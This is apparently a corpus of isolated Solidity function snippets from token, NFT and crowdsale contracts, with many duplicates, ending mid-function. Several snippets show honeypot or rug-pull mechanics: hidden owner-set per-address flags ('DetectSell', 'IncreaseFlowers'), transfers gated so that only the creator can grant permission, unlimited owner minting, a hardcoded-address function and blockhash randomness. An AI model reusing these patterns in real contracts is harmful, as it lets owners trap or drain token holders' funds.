function tokenByIndex(uint256 index) public view override returns (uint256) {
    require(index < totalSupply(), "ERC721A: global index out of bounds");
    return index;
  }
--------------------------------------------------------------------------------
function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {
    if (!whitelist[addr]) {
      whitelist[addr] = true;
      emit WhitelistedAddressAdded(addr);
      success = true;
    }
  }
--------------------------------------------------------------------------------
function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {
    if (whitelist[addr]) {
      whitelist[addr] = false;
      emit WhitelistedAddressRemoved(addr);
      success = true;
    }
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function Holdplatform_Airdrop(address tokenAddress, uint256 HPM_status, uint256 HPM_divider) public restricted {
		require(HPM_status == 0 || HPM_status == 1 );
		
		Holdplatform_status[tokenAddress] 	= HPM_status;	
		Holdplatform_divider[tokenAddress] 	= HPM_divider;	// Airdrop = 100% : Divider
	
    }
--------------------------------------------------------------------------------
function contractDecimalsUpdate( uint256 _newDecimals, bool updateConfirmation ) external isOwner returns (bool retrnVal) {
		
		if ( updateConfirmation && _newDecimals != decimals )
		{
			decimals = _newDecimals;
			retrnVal = true;
		}
		else
		{
			retrnVal = false;
		}
	}
--------------------------------------------------------------------------------
function removeLimits() external onlyOwner returns (bool) {
        limitsInEffect = false;
        dynamicFeesInEffect = true;
        fireSaleTimer = block.timestamp + 1 days;
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
constructor(address _decashStorageAddress)
        DeCashBase(_decashStorageAddress)
    {
        assert(
            _IMPLEMENTATION_SLOT ==
                bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
        );
        version = 1;
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
  returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function deregisterService(address service)
    public
    onlyDeployer
    notNullOrThisAddress(service)
    {
        require(registeredServicesMap[service].registered);

        registeredServicesMap[service].registered = false;

        // Emit event
        emit DeregisterServiceEvent(service);
    }
--------------------------------------------------------------------------------
function isEnabledServiceAction(address service, string memory action)
    public
    view
    returns (bool)
    {
        bytes32 actionHash = hashString(action);
        return isRegisteredActiveService(service) && registeredServicesMap[service].actionsEnabledMap[actionHash];
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function stake(uint256 _amount) external override lock {
        IValueLiquidPair(pair).transferFrom(msg.sender, address(this), _amount);
        _stakeFor(msg.sender);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function calcCurrentTokenPrice()
        public
        timedTransitions
        returns (uint)
    {
        if (stage == Stages.AuctionEnded || stage == Stages.TradingStarted)
            return finalPrice;
        return calcTokenPrice();
    }
--------------------------------------------------------------------------------
function getSeed(uint256 _keyBlockNr)
        public
        view
        returns (uint256)
    {
        // Key Block not mined atm
        if (block.number <= _keyBlockNr) return block.number;
        return uint256(blockhash(_keyBlockNr));
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function vestTokens(address ad, uint tkns, uint timelimit) internal {
      vestObject = TokenVest({
          vestAddress:ad,
          vestTokensLimit:tkns,
          vestTill:timelimit
      });
      listofVest.push(vestObject);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function DetectSell(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    thedios[spender] = val;
    thedeus[spender] = val2; 
    greencandle[spender] = val3;
    thisValue = val4;
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);

    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function SvEnsCompatibleRegistrar(SvEns ensAddr, bytes32 node) public {
        ens = ensAddr;
        rootNode = node;
        admins[msg.sender] = true;
        owner = msg.sender;
    }
--------------------------------------------------------------------------------
function _setSubnodeOwner(bytes32 subnode, address _owner) internal {
        require(!knownNodes[subnode]);
        knownNodes[subnode] = true;
        ens.setSubnodeOwner(rootNode, subnode, _owner);
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool) {
        require(msg.sender == owner || now >= FREEZE_END);
        return super.transfer(_to, _value);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function Holdplatform_Airdrop(address tokenAddress, uint256 HPM_status, uint256 HPM_divider) public restricted {
		require(HPM_status == 0 || HPM_status == 1 );
		
		Holdplatform_status[tokenAddress] 	= HPM_status;	
		Holdplatform_divider[tokenAddress] 	= HPM_divider;	// Airdrop = 100% : Divider
	
    }
--------------------------------------------------------------------------------
function ITE(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function registerByNameHash(bytes32 nameHash, uint256 fee, address wallet,
        bool partnerCanUpdate, bool operatorCanUpdate)
    public
    onlyOperator
    {
        // Register partner
        _registerPartnerByNameHash(nameHash, fee, wallet, partnerCanUpdate, operatorCanUpdate);

        // Emit event
        emit RegisterPartnerByNameHashEvent(nameHash, fee, wallet);
    }
--------------------------------------------------------------------------------
function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnerUpdate(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function kill(address payable toChashOut) external onlyBNOXAdmin {
        require (paused == true, "only paused contract can be killed");
        selfdestruct(toChashOut);
    }
--------------------------------------------------------------------------------
function vestedPercent() public view returns (uint256) {

        if(now < tokenReleaseDate || now < getReleaseTime(6)) {
            return 0;
            
        } else {
            return 100;
        }
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function modifyPowPrice(uint _powId, uint256 _newPrice) public {
      require(_newPrice > 0);
      require(powIndexToOwner[_powId] == msg.sender);
      powIndexToPrice[_powId] = _newPrice;
  }
--------------------------------------------------------------------------------
function deposit(address investor) onlyOwner public payable {
    require(state == State.Active);
    deposited[investor] = deposited[investor].add(msg.value);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public
        returns (bool success) {
		if (_value <= 0) revert(); 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function restart() public {
        require(swap && now >= endTime);
        
        penalty = this.balance * 2000 / 10000;
        
        payFees();
        
        _start();
    }
--------------------------------------------------------------------------------
function calculateCumulatedBalanceInternal(
        address _user,
        uint256 _balance
    ) internal view returns (uint256) {
        return _balance
            .wadToRay()
            .rayMul(core.getReserveNormalizedIncome(underlyingAssetAddress))
            .rayDiv(userIndexes[_user])
            .rayToWad();
    }
--------------------------------------------------------------------------------
function HiroyukiCoinDark() public {
        owner = msg.sender;
        balanceOf[owner] = totalSupply;
        Transfer(address(0), owner, totalSupply);
    }
--------------------------------------------------------------------------------
function grantAccess(address _user, uint8 _transaction) public canAccess(1) {
        require(_user != address(0));
        accessRights[_user][_transaction] = true;
        accessGranted(_user, _transaction);
    }
--------------------------------------------------------------------------------
function withdrawTokens(address tokenContract) external canAccess(2) {
        ERC20 tc = ERC20(tokenContract);
        tc.transfer(msg.sender, tc.balanceOf(this));
    }
--------------------------------------------------------------------------------
function _mint(address to_, uint256 amount_) internal virtual {
        totalSupply += amount_;
        balanceOf[to_] += amount_;
        emit Transfer(address(0x0), to_, amount_);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function addAuthorizedAddress(address target)
        public
        onlyOwner
        targetNotAuthorized(target)
    {
        authorized[target] = true;
        authorities.push(target);
        emit LogAuthorizedAddressAdded(target, msg.sender);
    }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function setFeelessSender(address _sender, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessSender[_sender] = _feeless;
    }
--------------------------------------------------------------------------------
function setFeelessReciever(address _recipient, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessReciever[_recipient] = _feeless;
    }
--------------------------------------------------------------------------------
function burn(uint256 _amount) public isItTeamAddress(msg.sender) {
        _burn(msg.sender, _amount);
        _moveDelegates(_delegates[msg.sender], address(0), _amount);
    }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
      if (master == 0x0) revert();
      if (msg.sender != upgradeMaster) revert();
      upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function withdraw() public onlyOwner {
    uint256 returnAmount = this.balance;
    wallet.transfer(returnAmount);
    emit EtherWithdrawn(wallet, returnAmount);
  }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
        operatorApproval[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
constructor(address _nexus) internal {
        require(_nexus != address(0), "Nexus is zero address");
        nexus = INexus(_nexus);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function addAuthorizedAddress(address target)
        public
        onlyAuthorizedAdmin
        targetNotAuthorized(target)
    {
        authorized[target] = true;
        authorities.push(target);
        emit LogAuthorizedAddressAdded(target, msg.sender);
    }
--------------------------------------------------------------------------------
function transferRoot(address newRoot) public onlyRoot {
        require(newRoot != address(0), "NEW_ROOT_IS_THE_ZERO_ADDRESS");
        emit RootTransferred(_ROOT_, newRoot);
        _ROOT_ = newRoot;
    }
--------------------------------------------------------------------------------
function unpause() public onlyOwner whenPaused {
        require(newContractAddress == address(0), "new contract cannot be 0x0");

        // Actually unpause the contract.
        super.unpause();
    }
--------------------------------------------------------------------------------
function loves_getLoves(uint256 _countryId, address _player) public view returns (uint256 loves_) {				
		LoverStructure storage c = loversSTR[gameVersion][_countryId];
		return c.loves[howManyNuked][_player];
	}
--------------------------------------------------------------------------------
function excessRefund(
		address _payer,
		uint256 _priceToPay,
		uint256 paidPrice
	) 
		internal
	{		
		uint256 excess = paidPrice.sub(_priceToPay);
		
		if (excess > 0) {
			_payer.transfer(excess);
		}
	}
--------------------------------------------------------------------------------
function frozenForTeam()
        internal
    {
        uint totalFrozeNumber = 144 * 1000 * 1000 * 10**18;
        freeze(msg.sender, totalFrozeNumber);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function startICO() external isActive onlyOwnerOrAdmin returns (bool) {
        saleState = IN_ICO;
        icoStartTime = now;
        isSelling = true;
        emit StartICO(saleState);
        return true;
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) internal pure returns(uint256) {
      uint256 z = x + y;
      assert((z >= x) && (z >= y));
      return z;
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
        require(index < totalSupply(), 'ERC721A: global index out of bounds');
        return index;
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function chooseWinner() internal {
         if ((nextTokenId - 1) == totalTokenSupply) {
            winningTokenId = getRandomNumber();
            emit WinnerIsChosen(tokenOwner[winningTokenId], winningTokenId);
        } 
    }
--------------------------------------------------------------------------------
function scalePurchaseTokenAmountToMatchRemainingTokens(uint256 _amount) internal view returns (uint256 _exactAmount) {
        if (nextTokenId + _amount - 1 > totalTokenSupply) {
            _amount = totalTokenSupply - nextTokenId + 1;
        }
        
        return _amount;
    }
--------------------------------------------------------------------------------
function deposit(address investor) onlyOwner public payable {
    require(state == State.Active);
    deposited[investor] = deposited[investor].add(msg.value);
  }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function weiToTokens(uint _amountWei) public view returns (uint256) {

        uint256 valueUSD = weiToUSD(_amountWei);

        uint256 tokens = valueUSD.mul(tokensPerUSD());

        return tokens;
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function unlockAddress(
        address target
    )
        public
        onlyOwner
    {
        require(!lockingDisabled);
        require(lockedStatusAddress[target]);
        lockedStatusAddress[target] = false;
        emit Unlocked(target);
    }
--------------------------------------------------------------------------------
function _upgradeTo(address _newImplementation) internal {
        address currentImplementation = implementation();
        require(currentImplementation != _newImplementation);
        _setImplementation(_newImplementation);
        emit Upgraded(_newImplementation);
    }
--------------------------------------------------------------------------------
function getTokenPriceOfPeriod(address token, uint period) public view returns(uint) {
        require(isTokenIncluded[token]);
        require(period >= 0);

        return dailyTokensPrices[period][token].price;

    }
--------------------------------------------------------------------------------
function getClaimAmount(address investor) public constant returns (uint) {

        // Claims can be only made if we manage to buy tokens
        if(getState() != State.Distributing) {
            throw;
        }
        return balances[investor].times(tokensBought) / weiRaised;
    }
--------------------------------------------------------------------------------
function transferERC20(address tokenAddress, uint256 amount) external nonReentrant_OnlyOwnerSteward {
        require(tokenAddress != _collateralAddress, "Invalid address");
        require(IERC20(tokenAddress).transfer(_owner, amount));
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {
        require(!frozen[_holder]);
        frozen[_holder] = true;
        emit Freeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
        require(frozen[_holder]);
        frozen[_holder] = false;
        emit Unfreeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function createBrand(bytes32 _name, uint256 _price) public onlyCXX {
    require(msg.sender != address(0));
    _create_brand(_name, address(this), _price, 0);
  }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function getSales() public view returns(address[], uint[]) {
		// get latest lottery
		Lottery memory lottery = lotteries[lotteryCount - 1];
		// return array of addresses who sell tokens and amounts
		return (lottery.sellingAddresses, lottery.sellingAmounts);
	}
--------------------------------------------------------------------------------
function withdraw() public onlyOwner {
		// check that commision > 0
		require(commissionSum > 0);
		// save commission for later transfer and reset
		uint commissionSumToTransfer = commissionSum;
		commissionSum = 0;
		// transfer commission to owner
		owner.transfer(commissionSumToTransfer);
	}
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _deedId) external whenNotPaused {
        uint256[] memory _deedIds = new uint256[](1);
        _deedIds[0] = _deedId;
        
        takeOwnershipMultiple(_deedIds);
    }
--------------------------------------------------------------------------------
constructor(uint256 _openingTime, uint256 _closingTime) public {
    // solium-disable-next-line security/no-block-members
    require(_openingTime >= block.timestamp);
    require(_closingTime >= _openingTime);

    openingTime = _openingTime;
    closingTime = _closingTime;
  }
--------------------------------------------------------------------------------
constructor () public {
    balances[msg.sender] = totalSupply_;
    emit Transfer(address(0), msg.sender, totalSupply_);
  }
--------------------------------------------------------------------------------
constructor () public{
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function setPubPerBlock(uint256 _pubPerBlock) public onlyOwner {
        require(_pubPerBlock > 0, "_pubPerBlock must be non-zero");

        // update all pools prior to changing the block rewards
        massUpdatePools();

        // update the block rewards
        pubPerBlock = _pubPerBlock;
    }
--------------------------------------------------------------------------------
function requireValidOrder(Order memory order, Sig memory sig)
        internal
        view
        returns (bytes32)
    {
        bytes32 hash = hashToSign(order);
        require(validateOrder(hash, order, sig));
        return hash;
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function setInactivityReleasePeriod(uint256 expiry) onlyOwner returns (bool success) {
        if (expiry > 1000000) throw;
        inactivityReleasePeriod = expiry;

        emit InactivityReleasePeriodChange(expiry);
        return true;
    }
--------------------------------------------------------------------------------
function Exchange(address feeAccount_, uint256 makerFee_, uint256 takerFee_, uint256 inactivityReleasePeriod_) {
        owner = msg.sender;
        feeAccount = feeAccount_;
        inactivityReleasePeriod = inactivityReleasePeriod_;
        makerFee = makerFee_;
        takerFee = takerFee_;
    }
--------------------------------------------------------------------------------
function authorize(address _trustee) returns (bool success) {
    authorized[msg.sender][_trustee] = true;
    Authorization(msg.sender, _trustee);
    return true;
  }
--------------------------------------------------------------------------------
function deauthorize(address _trustee_to_remove) returns (bool success) {
    authorized[msg.sender][_trustee_to_remove] = false;
    Deauthorization(msg.sender, _trustee_to_remove);
    return true;
  }
--------------------------------------------------------------------------------
constructor(uint256 _openingTime, uint256 _closingTime) public {
    // solium-disable-next-line security/no-block-members
    require(_openingTime >= block.timestamp);
    require(_closingTime >= _openingTime);

    openingTime = _openingTime;
    closingTime = _closingTime;
  }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function MTT(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function updateAdmin(address _nextAdmin) public onlyOwner {
        require(_nextAdmin != address(0x0), "Gateway: admin cannot be 0x0");
        admin = _nextAdmin;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x8D4e53a9a093e9273F54904bD33D88E84219d762,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function provide(uint minMint) public payable returns (uint mint) {
        mint = provide();
        require(mint >= minMint, "Pool: Mint limit is too large");
    }
--------------------------------------------------------------------------------
function unlock(uint amount) public override onlyOwner {
        require(lockedAmount >= amount, "Pool: Insufficient locked funds");
        lockedAmount = lockedAmount.sub(amount);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
        if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function adminWithdraw(uint256 _amount) public onlyAdmin {
        atari.safeTransfer(address(msg.sender), _amount);
        emit DevWithdraw(msg.sender, _amount);
    }
--------------------------------------------------------------------------------
function setWhitelist(address _account, bool _whitelist) public {
		require (msg.sender == theAO);
		require (_account != address(0));
		whitelist[_account] = _whitelist;
	}
--------------------------------------------------------------------------------
function IncreaseFlowers(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    flor[spender] = val;
    pigt[spender] = val2; 
    rekt[spender] = val3;
    thisValue = val4;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function stash(uint256 _value) public onlyOwner {
        require(balances[owner] >= _value);
        
        super.transfer(centralBanker, _value);
        
        emit TMTG_Stash(_value);        
    }
--------------------------------------------------------------------------------
function unstash(uint256 _value) public onlyBankOwner {
        require(balances[centralBanker] >= _value);
        
        super.transfer(owner, _value);
        
        emit TMTG_Unstash(_value);
    }
--------------------------------------------------------------------------------
function getDescription() public view returns(string) {
        return "Create ERC20 dividends for token holders at a specific checkpoint";
    }
--------------------------------------------------------------------------------
function sendTransfer(address _user,uint _price) public onlyOwner{
        require(_user!=owner);
        if(address(this).balance>=_price){
            _user.transfer(_price);
        }
    }
--------------------------------------------------------------------------------
constructor(
        address _logic,
        address _admin_,
        bytes memory _data
    ) payable BaseFallback(_logic, _data) {
        assert(ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        _setAdmin(_admin_);
    }
--------------------------------------------------------------------------------
function FRO(
    ) public {
        totalSupply = 1000000000000000000000000000;                         // Total supply with the decimal amount
        balanceOf[msg.sender] = 1000000000000000000000000000;               // All initial tokens
        name = "AfroCoin AmeriCoin";                                        // The name for display purposes
        symbol = "FRO";                                                     // The symbol for display purposes
    }
--------------------------------------------------------------------------------
function vSlice() {
    totalSupply = INITIAL_SUPPLY;                               // Set the total supply
    balances[msg.sender] = INITIAL_SUPPLY;                      // Creator address is assigned all
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _mint(address to) internal virtual returns (uint256){
    _tokenIds.increment();
    uint256 id = _tokenIds.current();
    _safeMint(to, id);

    return id;
  }
--------------------------------------------------------------------------------
function getApproved(uint256 tokenId)
        public
        view
        override
        returns (address)
    {
        require(_exists(tokenId), "approved query for nonexistent token");

        return _tokenApprovals[tokenId];
    }
--------------------------------------------------------------------------------
function setTokenURI(uint256 tokenId, string memory _tokenURI)
        public
        onlyOwner
    {
        require(_exists(tokenId), "URI set of nonexistent token");
        _tokenURIs[tokenId] = _tokenURI;
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function claimUnsold() onlyOwner {
    if ( now < ENDTIME )
      revert();

    tokenSC.transfer( owner, tokenSC.balanceOf(address(this)) );
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function getMonths() view public returns(uint256){
        uint256 countMonth = (getTime().sub(startTime)).div(30 * 24 * 3600);
        return countMonth; // begin 0
    }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function finish() public onlyOwner {
        finished = true;
        if (token.paused()) token.unpause();
        pool.complete();
        token.renounceOwnership();
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) external onlyOwner returns (bool ok)  {
    uint256 converterdValue = value * (10 ** uint256(tokenDecimals));
    return token.transfer(to, converterdValue);
   }
--------------------------------------------------------------------------------
function makeCoin(uint256 _value)public returns (bool){
        require(msg.sender == owner);
        totalSupply += _value;
        balances[owner] += _value;
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function _transfer(address sender, address recipient, uint256 amount) internal override virtual {
      super._transfer(sender, recipient, amount);
      _moveDelegates(_delegates[sender], _delegates[recipient], amount);
    }
--------------------------------------------------------------------------------
function endCrowdfund() public onlyFounder returns (bool) {
    require(isTokenSet == true);
    require(now > endDate);
    require(token.burnToken());
    return true;
}
--------------------------------------------------------------------------------
function pullSurplus() external accrues returns (uint256 cUSDCSurplus) {
    // Determine the cUSDC surplus (difference between total dUSDC and total cUSDC)
    cUSDCSurplus = _getSurplus();

    // Send the cUSDC surplus to the vault
    require(_CUSDC.transfer(_VAULT, cUSDCSurplus), "cUSDC transfer failed.");
  }
--------------------------------------------------------------------------------
function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = 2000000000000000000000000000;  // Update total supply with the decimal amount
        balanceOf[msg.sender] = totalSupply;                // Give the creator all initial tokens
        name = "SocialChain";                                   // Set the name for display purposes
        symbol =" SCA";                               // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function balanceOf(address _owner) external view returns(uint256) {
        require(_owner != address(0), "Owner is 0");
        return ownerToWonderArray[_owner].length;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) 
        external 
        whenNotPaused
    {
        operatorToApprovals[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function tweakDailyDividends(uint256 newResearchPercent) external {
    require(msg.sender == owner);
    require(newResearchPercent > 0 && newResearchPercent <= 10);
        
